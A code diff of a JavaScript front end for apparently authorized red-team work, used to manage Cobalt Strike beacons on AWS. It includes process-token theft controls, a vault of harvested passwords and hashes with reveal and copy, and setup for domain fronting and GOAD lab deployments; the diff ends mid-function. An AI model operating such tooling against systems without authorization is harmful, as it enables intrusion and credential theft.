+    // ── Beacon Management ──
+    // Helper: run a config action, show acknowledgement + result in CONSOLE + config output
+    async _runConfigAction(url, method, label, body) {
+        const output = document.getElementById('beacon-command-output');
+        try {
+            const opts = { method: method || 'POST', headers: { 'Content-Type': 'application/json' } };
+            if (body) opts.body = JSON.stringify(body);
+            const resp = await fetch(url, opts);
+            const data = await resp.json();
+            if (!data.success) {
+                this._showConfigOutput(`${label}: ${data.error || 'Failed'}`, 'error');
+                if (output) output.innerHTML += `<span style="color: var(--terminal-danger);">[-] ${label}: ${this.escapeHtml(data.error || 'Failed')}</span>\n`;
+                return;
+            }
+            const taskId = data.data?.taskId;
+            const ack = data.data?.message || '';
+            // Show immediate acknowledgement in both console and config output
+            const ackText = ack || `${label} queued`;
+            this._showConfigOutput(ackText, 'info');
+            if (output) {
+                output.innerHTML += `<span style="color: var(--terminal-info);">[*] ${this.escapeHtml(ackText)}</span>\n`;
+                output.scrollTop = output.scrollHeight;
+            }
+            // Poll for actual result if we have a taskId
+            if (taskId) {
+                this._taskFeedKnown.add(taskId);
+                this._taskFeedPolling.add(taskId);
+                this._pollConfigTask(taskId, label, output);
+            }
+        } catch (e) {
+            this._showConfigOutput(`${label}: network error`, 'error');
+        }
+    },
+
+    async _pollConfigTask(taskId, label, consoleOutput, attempts = 0) {
+        if (attempts > 15) return; // stop silently — some tasks never complete (fire-and-forget)
+        await new Promise(r => setTimeout(r, attempts < 3 ? 2000 : 5000));
+        try {
+            const resp = await fetch(`/api/beacon/task/${taskId}`);
+            const data = await resp.json();
+            if (!data.success || !data.task) {
+                this._pollConfigTask(taskId, label, consoleOutput, attempts + 1);
+                return;
+            }
+            const task = data.task;
+            const status = (task.taskStatus || task.status || '').toUpperCase();
+
+            // Check for acknowledgements (CS shows these immediately)
+            const acks = task.taskAcknowledgements || [];
+            if (acks.length > 0 && attempts === 0) {
+                acks.forEach(a => {
+                    const text = a.text || '';
+                    if (text && consoleOutput) {
+                        consoleOutput.innerHTML += `<span style="color: var(--terminal-success);">[+] ${this.escapeHtml(text)}</span>\n`;
+                        consoleOutput.scrollTop = consoleOutput.scrollHeight;
+                    }
+                });
+            }
+
+            // Check for results
+            if (status === 'OUTPUT_RECEIVED' || status === 'COMPLETED' || status === 'COMPLETE') {
+                const text = this._extractTaskOutput(task);
+                if (text) {
+                    this._showConfigOutput(`${label}: ${text}`, 'success');
+                    if (consoleOutput) {
+                        consoleOutput.innerHTML += `<span style="color: var(--terminal-success);">[+] ${this.escapeHtml(text)}</span>\n`;
+                        consoleOutput.scrollTop = consoleOutput.scrollHeight;
+                    }
+                }
+                return;
+            }
+
+            // Check for errors
+            const errors = task.error || [];
+            if (errors.length > 0) {
+                const errText = errors.map(e => e.text || e).join('; ');
+                this._showConfigOutput(`${label}: ${errText}`, 'error');
+                if (consoleOutput) {
+                    consoleOutput.innerHTML += `<span style="color: var(--terminal-danger);">[-] ${this.escapeHtml(errText)}</span>\n`;
+                    consoleOutput.scrollTop = consoleOutput.scrollHeight;
+                }
+                return;
+            }
+
+            this._pollConfigTask(taskId, label, consoleOutput, attempts + 1);
+        } catch (e) {
+            this._pollConfigTask(taskId, label, consoleOutput, attempts + 1);
+        }
+    },
+
+    async forceCheckin() {
+        if (!this.selectedBid) return;
+        await this._runConfigAction(`/api/beacon/${this.selectedBid}/checkin`, 'POST', 'Check-in');
+    },
+
+    async clearQueue() {
+        if (!this.selectedBid) return;
+        await this._runConfigAction(`/api/beacon/${this.selectedBid}/clear-queue`, 'POST', 'Clear queue');
+    },
+
+    async deleteBeacon() {
+        if (!this.selectedBid) return;
+        const resp = await fetch(`/api/beacon/${this.selectedBid}/delete`, { method: 'DELETE' });
+        const data = await resp.json();
+        if (data.success) {
+            this.closeInteract();
+            this.refreshBeacons();
+        } else {
+            this._showConfigOutput(`Delete: ${data.error}`, 'error');
+        }
+    },
+
+    async setNote() {
+        if (!this.selectedBid) return;
+        const note = document.getElementById('config-beacon-note')?.value || '';
+        this._logToConsole('note ' + note);
+        await this._runConfigAction(`/api/beacon/${this.selectedBid}/note`, 'POST', 'Note', { note });
+    },
+
+    async getBeaconInfo() {
+        if (!this.selectedBid) return;
+        await this._runConfigAction(`/api/beacon/${this.selectedBid}/info`, 'POST', 'Beacon info');
+    },
+
+    // ── Token Store (Wallet) ──
+    async loadTokenStore() {
+        if (!this.selectedBid) return;
+        const body = document.getElementById('token-store-body');
+        if (!body) return;
+        body.innerHTML = '<div class="feature-empty">Loading token store...</div>';
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/tokenstore/list`, { method: 'POST' });
+            const data = await resp.json();
+            if (!data.success) {
+                body.innerHTML = `<div class="feature-empty">${data.error || 'Failed to load tokens'}</div>`;
+                return;
+            }
+            const taskId = data.data?.taskId || data.result?.taskId;
+            if (taskId) {
+                this._trackTaskInConsole(taskId);
+                this._pollTokenStoreResults(taskId, body);
+            } else {
+                body.innerHTML = '<div class="feature-empty">No tokens in store.</div>';
+            }
+        } catch (e) { body.innerHTML = '<div class="feature-empty">Error loading token store</div>'; }
+    },
+
+    async _pollTokenStoreResults(taskId, container, attempts = 0) {
+        if (attempts > 15) return;
+        await new Promise(r => setTimeout(r, attempts < 3 ? 2000 : 4000));
+        try {
+            const resp = await fetch(`/api/beacon/task/${taskId}`);
+            const data = await resp.json();
+            if (data.success && data.task) {
+                const status = (data.task.taskStatus || '').toUpperCase();
+                if (status === 'OUTPUT_RECEIVED' || status === 'COMPLETED') {
+                    const results = data.task.result || [];
+                    const tsResult = results.find(r => r.type === 'tokenStore');
+                    const tokens = tsResult?.tokens || [];
+                    this._renderTokenStoreTable(tokens, container);
+                    return;
+                }
+            }
+            this._pollTokenStoreResults(taskId, container, attempts + 1);
+        } catch (e) {
+            this._pollTokenStoreResults(taskId, container, attempts + 1);
+        }
+    },
+
+    _renderTokenStoreTable(tokens, container) {
+        if (!tokens.length) {
+            container.innerHTML = '<div class="feature-empty">No tokens in store. Use "Steal & Store" to add tokens.</div>';
+            return;
+        }
+        let html = '<table class="feature-table"><thead><tr><th>ID</th><th>PID</th><th>User</th><th>Actions</th></tr></thead><tbody>';
+        tokens.forEach(t => {
+            const id = t.id ?? t.tokenId ?? '?';
+            const pid = t.pid || '';
+            const user = t.user || t.username || 'Unknown';
+            html += `<tr><td>${id}</td><td>${pid}</td><td>${this.escapeHtml(user)}</td><td>
+                <button class="btn btn-sm btn-success" onclick="BEACON.tokenStoreUse(${id})">Use</button>
+                <button class="btn btn-sm btn-danger" onclick="BEACON.tokenStoreRemove(${id})">Delete</button>
+            </td></tr>`;
+        });
+        html += '</tbody></table>';
+        container.innerHTML = html;
+    },
+
+    async tokenStoreSteal() {
+        if (!this.selectedBid) return;
+        const pid = document.getElementById('token-steal-pid')?.value;
+        if (!pid) return;
+        this._logToConsole('steal_token ' + pid);
+        await this._runConfigAction(`/api/beacon/${this.selectedBid}/tokenstore/steal`, 'POST', 'Token steal', { pid: parseInt(pid) });
+        setTimeout(() => this.loadTokenStore(), 5000);
+    },
+
+    async tokenStoreStealAndUse() {
+        if (!this.selectedBid) return;
+        const pid = document.getElementById('token-steal-pid')?.value;
+        if (!pid) return;
+        this._logToConsole('steal_token ' + pid + ' (use)');
+        await this._runConfigAction(`/api/beacon/${this.selectedBid}/tokenstore/steal-and-use`, 'POST', 'Token steal+use', { pid: parseInt(pid) });
+        setTimeout(() => { this.loadTokenStore(); this.getUid(); }, 5000);
+    },
+
+    async tokenStoreUse(tokenId) {
+        if (!this.selectedBid) return;
+        this._logToConsole('token_store use ' + tokenId);
+        await this._runConfigAction(`/api/beacon/${this.selectedBid}/tokenstore/use`, 'POST', 'Token use', { id: tokenId });
+        setTimeout(() => this.getUid(), 5000);
+    },
+
+    async tokenStoreRemove(tokenId) {
+        if (!this.selectedBid) return;
+        await this._runConfigAction(`/api/beacon/${this.selectedBid}/tokenstore/remove`, 'POST', 'Token remove', { ids: [tokenId] });
+        setTimeout(() => this.loadTokenStore(), 3000);
+    },
+
+    async tokenStoreClearAll() {
+        if (!this.selectedBid) return;
+        if (!confirm('Remove all stored tokens?')) return;
+        await this._runConfigAction(`/api/beacon/${this.selectedBid}/tokenstore/remove-all`, 'POST', 'Token clear all');
+        setTimeout(() => this.loadTokenStore(), 3000);
+    },
+
+    // ── Credential Vault (server-wide) ──
+    _credentialCache: null,
+
+    async loadCredentialVault() {
+        const body = document.getElementById('creds-vault-body');
+        if (body) body.innerHTML = '<div class="feature-empty">Loading credentials...</div>';
+        try {
+            const resp = await fetch('/api/beacon/data/credentials');
+            const data = await resp.json();
+            if (!body) return;
+            if (!data.success || !data.data) {
+                body.innerHTML = `<div class="feature-empty">${data.error || 'No credentials found'}</div>`;
+                return;
+            }
+            const creds = Array.isArray(data.data) ? data.data : [];
+            this._credentialCache = creds;
+            this._renderCredentialVault(creds);
+        } catch (e) {
+            if (body) body.innerHTML = `<div class="feature-empty">Error: ${e.message}</div>`;
+        }
+    },
+
+    _renderCredentialVault(creds) {
+        const body = document.getElementById('creds-vault-body');
+        if (!body) return;
+        if (!creds.length) {
+            body.innerHTML = '<div class="feature-empty">No credentials harvested yet. Run extraction commands to populate.</div>';
+            return;
+        }
+        let html = '<table class="feature-table"><thead><tr><th>User</th><th>Realm</th><th>Password/Hash</th><th>Source</th><th>Actions</th></tr></thead><tbody>';
+        creds.forEach(c => {
+            const user = c.user || c.username || '?';
+            const realm = c.realm || c.domain || '';
+            const pass = c.password || c.hash || '';
+            const source = c.source || '';
+            const id = c.id || '';
+            const masked = pass.length > 8 ? pass.substring(0, 4) + '...' + pass.substring(pass.length - 4) : '****';
+            const fullPass = this.escapeHtml(pass);
+            const maskedHtml = this.escapeHtml(masked);
+            html += `<tr>
+                <td>${this.escapeHtml(user)}</td>
+                <td>${this.escapeHtml(realm)}</td>
+                <td><span class="cred-password" style="cursor: pointer; font-family: monospace;" title="Click to reveal / Double-click to copy" data-full="${this.escapeAttr(pass)}" data-masked="${this.escapeAttr(masked)}" data-revealed="false" onclick="this.dataset.revealed=this.dataset.revealed==='false'?'true':'false'; this.textContent=this.dataset.revealed==='true'?this.dataset.full:this.dataset.masked;" ondblclick="navigator.clipboard.writeText(this.dataset.full); this.style.color='var(--success-text)'; setTimeout(()=>this.style.color='',1000);">${maskedHtml}</span></td>
+                <td>${this.escapeHtml(source)}</td>
+                <td><button class="btn btn-sm btn-danger" onclick="BEACON.deleteCredential('${id}')">Delete</button></td>
+            </tr>`;
+        });
+        html += '</tbody></table>';
+        body.innerHTML = html;
+    },
+
+    filterCredentials(query) {
+        if (!this._credentialCache) return;
+        const q = query.toLowerCase();
+        const filtered = this._credentialCache.filter(c =>
+            (c.user || '').toLowerCase().includes(q) ||
+            (c.realm || c.domain || '').toLowerCase().includes(q) ||
+            (c.source || '').toLowerCase().includes(q)
+        );
+        this._renderCredentialVault(filtered);
+    },
+
+    async deleteCredential(credId) {
+        try {
+            const resp = await fetch(`/api/beacon/data/credentials/${credId}`, { method: 'DELETE' });
+            const data = await resp.json();
+            this._logResultToConsole(data.success ? 'Credential deleted' : `Error: ${data.error}`, data.success ? 'success' : 'error');
+        } catch (e) { /* ignore */ }
+        this.loadCredentialVault();
+    },
+};
+
+// ============================================================================
+// CONFIGURATION
+// ============================================================================
+
 async function loadConfig() {
     console.log('Loading Configuration...');
     try {
@@ -1121,25 +6022,22 @@ async function loadConfig() {
                 cidrDisplay = config.management_cidr_blocks.join(', ');
             }
             
-            // Convert backup domains array to comma-separated string
-            let backupDomainsDisplay = '';
+            // Extract saved backup domain names for multi-select restoration
+            let savedBackupDomains = [];
             if (Array.isArray(config.backup_domains)) {
-                backupDomainsDisplay = config.backup_domains
+                savedBackupDomains = config.backup_domains
                     .map(d => typeof d === 'object' ? d.domain_name : d)
-                    .filter(d => d)
-                    .join(', ');
+                    .filter(d => d);
             }
-            
+
             // Populate form fields
             const fields = {
-                'deployment-type': config.deployment_type || config.engagement_type || '',
+                'deployment-type': config.deployment_type || config.engagement_type || 'c2-adhoc',
                 'environment': config.environment || 'dev',
                 'aws-region': config.aws_region || 'eu-central-1',
                 'key-pair-name': config.key_pair_name || '',
                 'management-cidr': cidrDisplay,
-                'primary-domain': config.primary_domain_name || '',
-                'backup-domains': backupDomainsDisplay,
-                'c2-subdomain': config.c2_subdomain || 'c2',
+                'c2-subdomain': config.c2_subdomain || 'api',
                 'www-subdomain': config.www_subdomain || 'www',
                 'cdn-subdomain': config.cdn_subdomain || 'cdn',
                 'c2-server-count': config.c2_server_count || 2,
@@ -1156,7 +6054,16 @@ async function loadConfig() {
                 const element = document.getElementById(id);
                 if (element) element.value = value;
             });
-            
+
+            // Load Route 53 domains into primary + backup dropdowns, restore saved selections
+            await loadRoute53Domains(config.primary_domain_name || '', savedBackupDomains);
+
+            // Restore decoy theme selection
+            const decoySelect = document.getElementById('decoy-theme');
+            if (decoySelect && config.decoy_theme) {
+                decoySelect.value = config.decoy_theme;
+            }
+
             // Restore malleable profile selection and update preview
             const malleableSelect = document.getElementById('malleable-profile');
             if (malleableSelect && config.malleable_profile) {
@@ -1184,6 +6091,38 @@ async function loadConfig() {
                 abDiskSize.value = config.attack_box_root_volume_size;
             }
 
+            // Restore attack box password mode
+            if (config.attack_box_admin_password) {
+                const customRadio = document.querySelector('input[name="attack-box-pw-mode"][value="custom"]');
+                if (customRadio) { customRadio.checked = true; customRadio.dispatchEvent(new Event('change')); }
+                const pwInput = document.getElementById('attack-box-password');
+                if (pwInput) pwInput.value = config.attack_box_admin_password;
+            }
+
+            // Restore CS teamserver password mode
+            if (config.cs_teamserver_password) {
+                const presetRadio = document.querySelector('input[name="cs-pw-mode"][value="preset"]');
+                if (presetRadio) { presetRadio.checked = true; presetRadio.dispatchEvent(new Event('change')); }
+                const csPwInput = document.getElementById('cs-teamserver-password');
+                if (csPwInput) csPwInput.value = config.cs_teamserver_password;
+            }
+
+            // Restore CS license mode
+            if (config.cobalt_strike_license_secret_name) {
+                const secretRadio = document.querySelector('input[name="cs-license-mode"][value="secret"]');
+                if (secretRadio) { secretRadio.checked = true; secretRadio.dispatchEvent(new Event('change')); }
+            } else {
+                const manualRadio = document.querySelector('input[name="cs-license-mode"][value="manual"]');
+                if (manualRadio) { manualRadio.checked = true; manualRadio.dispatchEvent(new Event('change')); }
+            }
+
+            // Restore REST API toggle
+            const restApiToggle = document.getElementById('enable-rest-api');
+            if (restApiToggle) {
+                restApiToggle.checked = config.enable_cs_rest_api === true || config.enable_cs_rest_api === 'true';
+                restApiToggle.dispatchEvent(new Event('change'));
+            }
+
             // Restore domain fronting checkbox state
             const enableDomainFronting = config.enable_domain_fronting === true;
             const dfCheckbox = document.getElementById('enable-domain-fronting');
@@ -1199,6 +6138,13 @@ async function loadConfig() {
             APP.updateSSLForDomainFronting(enableDomainFronting);
             APP.updateFrontDomainVisibility(enableDomainFronting);
 
+            // Restore GOAD VPC CIDR and update derived IP range
+            const goadVpcCidr = document.getElementById('goad-vpc-cidr');
+            if (goadVpcCidr && config.goad_vpc_cidr) {
+                goadVpcCidr.value = config.goad_vpc_cidr;
+                updateGoadIpRange();
+            }
+
             // Update the deployment overview based on loaded type (this also updates project name)
             updateDeploymentType();
 
@@ -1213,6 +6159,34 @@ async function loadConfig() {
 // ============================================================================
 // CONFIGURATION FUNCTIONS
 // ============================================================================
+
+/**
+ * Derive the GOAD VM IP range prefix from the VPC CIDR and update the read-only field.
+ * Called on goad-vpc-cidr input change.
+ */
+function updateGoadIpRange() {
+    const cidrInput = document.getElementById('goad-vpc-cidr');
+    const ipRangeField = document.getElementById('goad-ip-range');
+    if (!cidrInput || !ipRangeField) return;
+
+    const cidr = (cidrInput.value || '').trim();
+    const match = cidr.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})\/(\d{1,2})$/);
+
+    if (match) {
+        const octets = [parseInt(match[1]), parseInt(match[2]), parseInt(match[3]), parseInt(match[4])];
+        const prefix = parseInt(match[5]);
+        const valid = octets.every(o => o >= 0 && o <= 255) && prefix >= 16 && prefix <= 28;
+        if (valid) {
+            ipRangeField.value = octets.slice(0, 3).join('.');
+            cidrInput.style.borderColor = '';
+            return;
+        }
+    }
+    // Invalid CIDR
+    ipRangeField.value = '';
+    if (cidr) cidrInput.style.borderColor = 'var(--danger-text)';
+    else cidrInput.style.borderColor = '';
+}
 
 /**
  * Parse CIDR input - supports comma-separated values
@@ -1246,29 +6220,15 @@ async function fetchMyPublicIP() {
     btn.disabled = true;
     
     try {
-        // Try multiple IP services in case one fails
-        const ipServices = [
-            'https://api.ipify.org?format=json',
-            'https://ipinfo.io/json',
-            'https://api.ip.sb/geoip'
-        ];
-        
-        let publicIP = null;
-        
-        for (const service of ipServices) {
-            try {
-                const response = await fetch(service, { timeout: 5000 });
-                if (response.ok) {
-                    const data = await response.json();
-                    publicIP = data.ip;
-                    if (publicIP) break;
-                }
-            } catch (e) {
-                console.log(`IP service ${service} failed, trying next...`);
-            }
-        }
-        
-        if (publicIP) {
+        // Use backend curl to get the real public IP.
+        // This bypasses iCloud Private Relay / VPN split-tunnelling
+        // which would give the browser a relay IP instead of the
+        // real IP that AWS security groups will see for SSH/RDP.
+        const response = await fetch(`${API_BASE}/config/public-ip`);
+        const data = await response.json();
+
+        if (data.success && data.ip) {
+            const publicIP = data.ip;
             // Format as CIDR /32 for single IP
             const cidrValue = `${publicIP}/32`;
             
@@ -1325,11 +6285,11 @@ const DEPLOYMENT_CONFIGS = {
             { icon: '🔀', label: 'Redirectors', value: '2' },
             { icon: '🖥️', label: 'Bastion', value: '1' },
             { icon: '💻', label: 'Attack Box', value: '1 (Win)' },
-            { icon: '💰', label: 'Est. Cost', value: '~$175/mo' }
+            { icon: '💰', label: 'Est. Cost', value: '~$245/mo' }
         ],
         details: 'Quick, minimal setup for one-off tests. Single C2 server with standard proxy infrastructure.',
         bestFor: 'Quick security tests, POCs, training',
-        architectureNote: 'Full C2 infrastructure with redirectors, bastion, and Windows attack box for operations.'
+        architectureNote: 'Full C2 infrastructure with redirectors, Linux bastion, and Windows attack box for operations.'
     },
     'c2-purple': {
         title: 'C2: Purple Team Deployment',
@@ -1347,11 +6307,11 @@ const DEPLOYMENT_CONFIGS = {
             { icon: '🔀', label: 'Redirectors', value: '2' },
             { icon: '🖥️', label: 'Bastion', value: '1' },
             { icon: '💻', label: 'Attack Box', value: '1 (Win)' },
-            { icon: '💰', label: 'Est. Cost', value: '~$205/mo' }
+            { icon: '💰', label: 'Est. Cost', value: '~$280/mo' }
         ],
         details: 'Redundant C2 infrastructure for collaborative exercises. High availability.',
         bestFor: 'Purple team exercises, collaborative testing',
-        architectureNote: 'Full C2 infrastructure with redirectors, bastion, and Windows attack box for operations.'
+        architectureNote: 'Full C2 infrastructure with redirectors, Linux bastion, and Windows attack box for operations.'
     },
     'c2-full': {
         title: 'C2: Full Red Team Deployment',
@@ -1368,12 +6328,12 @@ const DEPLOYMENT_CONFIGS = {
             { icon: '🔀', label: 'Redirectors', value: '2' },
             { icon: '🖥️', label: 'Bastion', value: '1' },
             { icon: '💻', label: 'Attack Box', value: '1 (Win)' },
-            { icon: '💰', label: 'Est. Cost', value: '~$235/mo' }
+            { icon: '💰', label: 'Est. Cost', value: '~$310/mo' }
         ],
         details: 'Phase-based C2: Staging → Post-Ex → Long-Haul. Full operational capability.',
         bestFor: 'Full red team engagements, long-term campaigns',
         phases: ['🚀 Staging', '⚡ Post-Ex', '🔒 Long-Haul'],
-        architectureNote: 'Full C2 infrastructure with redirectors, bastion, and Windows attack box for operations.'
+        architectureNote: 'Full C2 infrastructure with redirectors, Linux bastion, and Windows attack box for operations.'
     },
     // GOAD Lab options (Proper architecture: Jumpbox → Team Server + Windows Attack Box)
     'goad-mini': {
@@ -1390,7 +6350,7 @@ const DEPLOYMENT_CONFIGS = {
             { icon: '🚪', label: 'Jumpbox', value: '1' },
             { icon: '🔴', label: 'Team Server', value: '1' },
             { icon: '🖥️', label: 'Attack Box', value: '1 (Win)' },
-            { icon: '💰', label: 'Est. Cost', value: '~$195/mo' }
+            { icon: '💰', label: 'Est. Cost', value: '~$260/mo' }
         ],
         details: 'Single DC (sevenkingdoms.local) with Team Server + Windows Attack Box.',
         bestFor: 'Learning AD attacks, quick testing',
@@ -1411,7 +6371,7 @@ const DEPLOYMENT_CONFIGS = {
             { icon: '🚪', label: 'Jumpbox', value: '1' },
             { icon: '🔴', label: 'Team Server', value: '1' },
             { icon: '🖥️', label: 'Attack Box', value: '1 (Win)' },
-            { icon: '💰', label: 'Est. Cost', value: '~$360/mo' }
+            { icon: '💰', label: 'Est. Cost', value: '~$425/mo' }
         ],
         details: '3 VMs, 1 forest, 2 domains. Smaller version of full GOAD.',
         bestFor: 'Trust attacks, cross-domain techniques',
@@ -1432,9 +6392,9 @@ const DEPLOYMENT_CONFIGS = {
             { icon: '🚪', label: 'Jumpbox', value: '1' },
             { icon: '🔴', label: 'Team Server', value: '1' },
             { icon: '🖥️', label: 'Attack Box', value: '1 (Win)' },
-            { icon: '💰', label: 'Est. Cost', value: '~$815/mo' }
+            { icon: '💰', label: 'Est. Cost', value: '~$550/mo' }
         ],
-        details: '4 VMs (t3.xlarge), 1 forest, 1 domain with Microsoft Configuration Manager.',
+        details: '4 VMs (3x t2.medium + 1x t2.large), 1 forest, 1 domain with Microsoft Configuration Manager.',
         bestFor: 'SCCM attacks, enterprise environments',
         attacks: ['NAA Credentials', 'PXE Boot Attacks', 'Task Sequence Attacks', 'SCCM Client Attacks'],
         architectureNote: '🔒 Training Lab: Jumpbox (SSH) → Team Server (CS only) + Windows Attack Box (CS Client + PowerSploit)'
@@ -1453,7 +6413,7 @@ const DEPLOYMENT_CONFIGS = {
             { icon: '🚪', label: 'Jumpbox', value: '1' },
             { icon: '🔴', label: 'Team Server', value: '1' },
             { icon: '🖥️', label: 'Attack Box', value: '1 (Win)' },
-            { icon: '💰', label: 'Est. Cost', value: '~$520/mo' }
+            { icon: '💰', label: 'Est. Cost', value: '~$595/mo' }
         ],
         details: '5 VMs, 2 forests, 3 domains. Complete AD training environment.',
         bestFor: 'Comprehensive AD training, forest attacks',
@@ -1474,7 +6434,7 @@ const DEPLOYMENT_CONFIGS = {
             { icon: '🚪', label: 'Jumpbox', value: '1' },
             { icon: '🔴', label: 'Team Server', value: '1' },
             { icon: '🖥️', label: 'Attack Box', value: '1 (Win)' },
-            { icon: '💰', label: 'Est. Cost', value: '~$520/mo' }
+            { icon: '💰', label: 'Est. Cost', value: '~$595/mo' }
         ],
         details: '5 VMs, 2 domains. Challenge lab - no schema provided!',
         bestFor: 'CTF practice, skill assessment',
@@ -1495,9 +6455,10 @@ const DEPLOYMENT_CONFIGS = {
         components: [
             { icon: '🎯', label: 'C2 Server', value: '1' },
             { icon: '🔀', label: 'Redirectors', value: '2' },
+            { icon: '🛡️', label: 'Bastion', value: '1' },
             { icon: '🏰', label: 'GOAD VMs', value: '1' },
             { icon: '💻', label: 'Attack Box', value: '1 (Win)' },
-            { icon: '💰', label: 'Est. Cost', value: '~$290/mo' }
+            { icon: '💰', label: 'Est. Cost', value: '~$380/mo' }
         ],
         details: 'Full C2 with redirectors + GOAD Mini. VPCs peered for realistic beacon traffic.',
         bestFor: 'Testing C2 tradecraft against AD targets',
@@ -1516,9 +6477,10 @@ const DEPLOYMENT_CONFIGS = {
         components: [
             { icon: '🎯', label: 'C2 Server', value: '1' },
             { icon: '🔀', label: 'Redirectors', value: '2' },
+            { icon: '🛡️', label: 'Bastion', value: '1' },
             { icon: '🏰', label: 'GOAD VMs', value: '3' },
             { icon: '💻', label: 'Attack Box', value: '1 (Win)' },
-            { icon: '💰', label: 'Est. Cost', value: '~$450/mo' }
+            { icon: '💰', label: 'Est. Cost', value: '~$545/mo' }
         ],
         details: 'Full C2 with redirectors + GOAD Light (multi-domain).',
         bestFor: 'Realistic red team training with trust attacks',
@@ -1537,9 +6499,10 @@ const DEPLOYMENT_CONFIGS = {
         components: [
             { icon: '🎯', label: 'C2 Servers', value: '3' },
             { icon: '🔀', label: 'Redirectors', value: '2' },
+            { icon: '🛡️', label: 'Bastion', value: '1' },
             { icon: '🏰', label: 'GOAD VMs', value: '5' },
             { icon: '💻', label: 'Attack Box', value: '1 (Win)' },
-            { icon: '💰', label: 'Est. Cost', value: '~$670/mo' }
+            { icon: '💰', label: 'Est. Cost', value: '~$780/mo' }
         ],
         details: 'Complete phased C2 (Staging/Post-Ex/Long-Haul) + Full GOAD lab.',
         bestFor: 'Full-scale red team exercises with realistic AD targets',
@@ -1684,7 +6647,7 @@ async function validateProjectName(checkBackend = false) {
     if (name.includes('XXX')) {
         projectNameInput.style.borderColor = 'var(--warning)';
         if (statusSpan) {
-            statusSpan.innerHTML = '<span style="color: var(--warning-text);">⚠️ Replace XXX with a unique identifier</span>';
+            statusSpan.innerHTML = '<span class="t-warning">⚠️ Replace XXX with a unique identifier</span>';
             statusSpan.style.display = 'block';
         }
         return false;
@@ -1694,7 +6657,7 @@ async function validateProjectName(checkBackend = false) {
     if (!/^[a-zA-Z][a-zA-Z0-9_-]*$/.test(name)) {
         projectNameInput.style.borderColor = 'var(--danger)';
         if (statusSpan) {
-            statusSpan.innerHTML = '<span style="color: var(--danger-text);">❌ Must start with letter, use only letters/numbers/_/-</span>';
+            statusSpan.innerHTML = '<span class="t-danger">❌ Must start with letter, use only letters/numbers/_/-</span>';
             statusSpan.style.display = 'block';
         }
         return false;
@@ -1707,7 +6670,7 @@ async function validateProjectName(checkBackend = false) {
     if (checkBackend) {
         try {
             if (statusSpan) {
-                statusSpan.innerHTML = '<span style="color: var(--text-muted);">🔍 Checking availability...</span>';
+                statusSpan.innerHTML = '<span class="t-muted">🔍 Checking availability...</span>';
                 statusSpan.style.display = 'block';
             }
             
@@ -1721,7 +6684,7 @@ async function validateProjectName(checkBackend = false) {
                         // AWS check failed — warn user
                         if (data.aws_warning) {
                             projectNameInput.style.borderColor = 'var(--warning)';
-                            statusSpan.innerHTML = '<span style="color: var(--warning-text);">⚠️ Available locally — AWS check failed, verify manually</span>';
+                            statusSpan.innerHTML = '<span class="t-warning">⚠️ Available locally — AWS check failed, verify manually</span>';
                         // History warning
                         } else if (data.history && data.history.previously_used) {
                             const h = data.history;
@@ -1732,9 +6695,9 @@ async function validateProjectName(checkBackend = false) {
                                 warningText += ' (had errors)';
                             }
                             projectNameInput.style.borderColor = 'var(--warning)';
-                            statusSpan.innerHTML = `<span style="color: var(--warning-text);">${warningText} - consider using a new name</span>`;
+                            statusSpan.innerHTML = `<span class="t-warning">${warningText} - consider using a new name</span>`;
                         } else {
-                            statusSpan.innerHTML = '<span style="color: var(--success-text);">✅ Available</span>';
+                            statusSpan.innerHTML = '<span class="t-success">✅ Available</span>';
                         }
                         statusSpan.style.display = 'block';
                     }
@@ -1759,7 +6722,7 @@ async function validateProjectName(checkBackend = false) {
                         } else {
                             reason = data.message || 'Not available';
                         }
-                        statusSpan.innerHTML = `<span style="color: var(--danger-text);">❌ ${reason}</span>`;
+                        statusSpan.innerHTML = `<span class="t-danger">❌ ${reason}</span>`;
                         statusSpan.style.display = 'block';
                     }
                     return false;
@@ -1864,7 +6827,7 @@ function updateDeploymentType() {
         }
         if (keyPairHint) {
             if (isGoadOnly) {
-                keyPairHint.innerHTML = '<span style="color: var(--success-text);">✅ GOAD deployments use YOUR SSH key. Upload your public key in the Deploy tab before deploying.</span>';
+                keyPairHint.innerHTML = '<span class="t-success">✅ GOAD deployments use YOUR SSH key. Upload your public key in the Deploy tab before deploying.</span>';
             } else {
                 keyPairHint.innerHTML = 'AWS EC2 key pair for SSH access to C2 servers';
             }
@@ -1879,12 +6842,19 @@ function updateDeploymentType() {
             }
         }
         
-        // Show/hide Malleable C2 profile section for C2 deployments
+        // Show/hide Decoy theme section for C2 deployments (has redirectors)
+        const decoySection = document.getElementById('decoy-theme-section');
+        if (decoySection) {
+            const hasC2 = config.type === 'c2' || config.type === 'combined';
+            decoySection.style.display = hasC2 ? 'block' : 'none';
+        }
+
+        // Show/hide Malleable C2 profile section — needed for any deployment with CS
         const malleableSection = document.getElementById('malleable-profile-section');
         if (malleableSection) {
-            // Show for any deployment that includes C2 infrastructure
-            const hasC2 = config.type === 'c2' || config.type === 'combined';
-            malleableSection.style.display = hasC2 ? 'block' : 'none';
+            // Show for any deployment that includes Cobalt Strike (C2, combined, or GOAD with CS)
+            const hasCS = config.requiresCS !== false;
+            malleableSection.style.display = hasCS ? 'block' : 'none';
         }
         
         // Show/hide SSL config section for C2 deployments
@@ -1899,6 +6869,13 @@ function updateDeploymentType() {
         if (domainFrontingSection) {
             const hasC2 = config.type === 'c2' || config.type === 'combined';
             domainFrontingSection.style.display = hasC2 ? 'block' : 'none';
+        }
+
+        // Show/hide GOAD Network config section for GOAD and Combined deployments
+        const goadNetworkSection = document.getElementById('goad-network-config-section');
+        if (goadNetworkSection) {
+            const hasGoad = config.type === 'goad' || config.type === 'combined';
+            goadNetworkSection.style.display = hasGoad ? 'block' : 'none';
         }
 
         // Show/hide Attack Box config section (available for all deployment types)
@@ -1920,7 +6897,25 @@ function updateDeploymentType() {
                     abOptions.style.pointerEvents = this.checked ? 'auto' : 'none';
                 };
             }
+
+            // Wire up attack box password radio toggles
+            document.querySelectorAll('input[name="attack-box-pw-mode"]').forEach(radio => {
+                radio.onchange = function() {
+                    const customPw = document.getElementById('attack-box-custom-pw');
+                    if (customPw) customPw.style.display = this.value === 'custom' ? 'block' : 'none';
+                };
+            });
         }
+
+        // Wire up CS password radio toggles
+        document.querySelectorAll('input[name="cs-pw-mode"]').forEach(radio => {
+            radio.onchange = function() {
+                const manualInfo = document.getElementById('cs-pw-manual-info');
+                const presetFields = document.getElementById('cs-pw-preset-fields');
